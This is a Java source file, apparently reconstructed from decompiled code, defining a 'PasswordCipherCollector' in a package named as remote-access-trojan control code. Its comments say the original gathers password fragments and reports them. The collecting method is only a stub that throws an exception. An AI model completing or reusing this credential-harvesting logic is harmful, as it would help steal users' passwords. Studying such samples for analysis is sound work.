package com.vendor.rat.control.plug;

import android.util.Log;
import java.io.Serializable;
import java.util.LinkedList;

/**
 * 密码密文收集器 (文本密码)
 * vendor: com.guard.wallet.plug.f
 *
 * 字段:
 *   - listenHelper (ReqListenHelper)
 *   - textParts (LinkedList) 文本片段
 *   - idParts (LinkedList) ID 片段
 *
 * 注意: vendor 的 a() 方法反编译失败 (527 instructions)
 */
public final class PasswordCipherCollector implements Serializable {

    private static final String TAG = "PasswordCipherCollector";

    // TODO: VENDOR_VERIFY - 需要 ReqListenHelper VO
    public Object listenHelper;
    public final LinkedList textParts = new LinkedList();
    public final LinkedList idParts = new LinkedList();

    /**
     * 提交收集到的文本密码
     * vendor: plug.f.a()
     *
     * 注意: vendor 原始方法反编译失败 (527 instructions, JADX dump skipped)
     * 推测逻辑与 PatternCipherCollector.submit() 类似:
     *   合并 textParts + idParts → 构建密码 → 上报
     */
    public final void submit() {
        // TODO: VENDOR_VERIFY - 反编译失败，需要用 --show-bad-code 重新反编译
        Log.d(TAG, "Password cipher submit, textParts=" + textParts.size()
                + ", idParts=" + idParts.size());
        throw new UnsupportedOperationException(
                "Method not decompiled: com.guard.wallet.plug.f.a():void");
    }
}
